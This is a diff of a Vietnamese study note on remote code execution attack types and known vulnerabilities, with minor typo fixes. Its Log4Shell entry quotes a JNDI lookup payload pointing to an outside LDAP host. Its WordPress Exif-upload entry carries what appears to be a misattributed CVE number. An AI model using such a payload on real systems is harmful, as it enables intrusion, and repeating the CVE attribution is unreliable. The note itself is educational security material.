@@ -51,13 +51,14 @@ d) Các loại tấn công RCE
 - Các loại tấn công phổ biến nhất là :
   - Tấn công Injection
   - Tấn công Deserialization: nếu ứng dụng không kiểm tra kĩ dữ liệu đầu vào từ người dùng, dữ iệu được chuỗi hóa có thể chứa mã độc và khi được deserialization, mã này sẽ được thực thi ( Deserialization là quá trình chuyển đổi chuỗi dữ liệu (byte stream) trở về đối tượng, cấu trùng dữ liệu ban đầu ( object, list,...)
-  - Ghi ngoài giới hạn (Outs-of-bounds write): đây là lỗi quản lý bộ nhớ xảy ra khi chương trình ghi dữ liệu vượt ra ngoài vùng bộ nhớ đệm ( Ví dụ: nếu bộ nhớ được cấp chỉ đủ lưu 10 byte nhưng chương trình cố ghi vào 20 byte, các byte bổ sung sẽ ghi đè lên bộ nhớ lân cận.
+  - Ghi ngoài giới hạn (Outs-of-bounds write): đây là lỗi quản lý bộ nhớ xảy ra khi chương trình ghi dữ liệu vượt ra ngoài vùng bộ nhớ đệm ( Ví dụ: nếu bộ nhớ được cấp chỉ đủ lưu 10 byte nhưng chương trình cố ghi vào 20 byte, các byte bổ sung sẽ ghi đè lên bộ nhớ lân cận. )
  
 e) Ví dụ về một số lỗ hổng đã biết
 
 - CVE-2021-44228 (Log4Shell): lỗ hổng xảy ra ở tích năng kết nối dịch vụ thông qua JNDI bằng cách sử dụng URL. Log4j không cung cấp bộ lọc nào để loại trừ các URL không xác định. Điều này xảy ra vì Log4j chứa cú pháp đặc biệt theo hình thức `${prefix:name}`. Ví dụ `${java:version}` là phiên bản Java đang chạy hiện tại, `${env:PATH}` lấy thông tin biến môi trường. Điều này rủi ro vì khi gặp chuỗi `${jndi:ldap://example.com/a}`, Log4j sẽ tự động kết nối với URL này
 
-- CVE-2021-1844: đây là lỗ hổng bảo mật trong WordPress trước 5.0.1. Kẻ tấn công có quyền tác giả có thể tải lên 1 hình ảnh được tạo đặc biệt chứa mã PHP trong metadata Exif ( ứng dụng phân tíhc, quản lý hình ảnh )
+- CVE-2021-1844: đây là lỗ hổng bảo mật trong WordPress trước 5.0.1. Kẻ tấn công có quyền tác giả có thể tải lên 1 hình ảnh được tạo đặc biệt chứa mã PHP trong metadata Exif ( ứng dụng phân tích, quản lý hình ảnh )
+
 
 **2. ACE**
 
